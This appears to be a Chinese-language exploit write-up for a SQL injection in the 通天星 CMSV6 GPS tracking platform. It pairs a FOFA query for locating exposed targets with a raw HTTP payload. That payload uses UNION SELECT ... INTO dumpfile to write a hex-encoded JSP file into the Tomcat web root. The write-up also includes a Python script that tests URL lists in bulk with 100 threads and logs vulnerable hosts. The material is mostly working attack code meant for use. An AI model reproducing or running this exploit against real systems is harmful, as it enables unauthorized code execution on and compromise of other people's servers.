### fofa

```markdown
body="/808gps/"
```

### payload

```markdown
POST /point_manage/merge HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded


id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```

![image-20240908135033115](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240908135033115.png)

重新刷新页面抓包，拼接路径    /allgods.jsp

![image-20240908135358019](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240908135358019.png)



### 命令

```markdown
python3 文件名.py -f url.txt   # 批量测试url
python3 文件名.py -u url		# 单个测试url
```

### poc

```python
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    banner = """
    
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-08
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='通天星CMSV6存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/point_manage/merge"
    url = target+payload
    headers={
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = (
        "id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL\r\n"
        "INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a\r\n"
        "WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8\r\n"
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        url2 = target+"/allgods.jsp"
        res2 = requests.get(url2, verify=False)
        if res.status_code == 200 and res2.status_code == 200 and 'zz010f' in res2.text :
            print(f"{GREEN}[+]该url存在漏洞{target}\n{RESET}")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+"\n")
                return True
        else:
            print(f"[-]该url不存在漏洞")
    except :
        print(f"[*]该url存在问题")
        return False

if __name__ == '__main__':
    main()
```

